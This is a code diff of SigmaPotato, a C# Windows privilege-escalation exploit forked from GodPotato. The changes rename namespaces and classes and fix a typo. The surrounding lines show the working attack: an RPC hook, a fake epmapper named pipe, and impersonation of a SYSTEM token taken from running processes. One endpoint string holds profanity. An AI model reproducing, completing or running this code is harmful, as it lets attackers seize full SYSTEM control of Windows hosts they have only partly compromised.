@@ -7,12 +7,12 @@ using System.Security.Permissions;
 using System.Security.Principal;
 using System.Threading;
 using SharpToken;
-using static SigmaPotato.NativeAPI.NativeMethods;
-using static SigmaPotato.NativeAPI.NewOrcbRPC;
+using static NativeAPI.NativeMethods;
+using static NativeAPI.NewOrcbRPC;
 
-namespace SigmaPotato.NativeAPI
+namespace NativeAPI
 {
-    public class GodPotatoNetContext
+    public class SigmaPotatoContext
     {
         private static readonly Guid orcbRPCGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");
         public IntPtr CombaseModule { get; private set; }
@@ -34,7 +34,7 @@ namespace SigmaPotato.NativeAPI
         public readonly string serverPipe = $"\\\\.\\pipe\\{"SigmaPotato"}\\pipe\\epmapper";
         public readonly string clientPipe = $"ncacn_np:localhost/pipe/{"SigmaPotato"}[\\pipe\\epmapper]";
 
-        public GodPotatoNetContext(TextWriter consoleWriter, string pipeName)
+        public SigmaPotatoContext(TextWriter consoleWriter, string pipeName)
         {
             this.PipeName = pipeName;
             this.newOrcbRPC = new NewOrcbRPC(this);
@@ -203,7 +203,7 @@ namespace SigmaPotato.NativeAPI
 
                             if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                             {
-                                SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {
+                                SharpToken.TokenUtils.ListProcessTokens(-1, processToken => {
                                     if (processToken.SID == "S-1-5-18" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
                                     {
                                         systemIdentity = new WindowsIdentity(processToken.TokenHandle);
@@ -298,7 +298,7 @@ namespace SigmaPotato.NativeAPI
                         stream.Flush();
                         stream.Close();
                     }
-                    catch (Exception e)
+                    catch
                     {
                         pipeServerThread.Interrupt();
                         pipeServerThread.Abort();
@@ -319,14 +319,14 @@ namespace SigmaPotato.NativeAPI
 
     class NewOrcbRPC
     {
-        private GodPotatoNetContext GodPotatoNetContext;
-        public NewOrcbRPC(GodPotatoNetContext GodPotatoNetContext)
+        private SigmaPotatoContext SigmaPotatoContext;
+        public NewOrcbRPC(SigmaPotatoContext SigmaPotatoContext)
         {
-            this.GodPotatoNetContext = GodPotatoNetContext;
+            this.SigmaPotatoContext = SigmaPotatoContext;
         }
         public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)
         {
-            string[] endpoints = { GodPotatoNetContext.clientPipe, "ncacn_ip_tcp:fuck you !" };
+            string[] endpoints = { SigmaPotatoContext.clientPipe, "ncacn_ip_tcp:fuck you !" };
 
             int entrieSize = 3;
             for (int i = 0; i < endpoints.Length; i++)
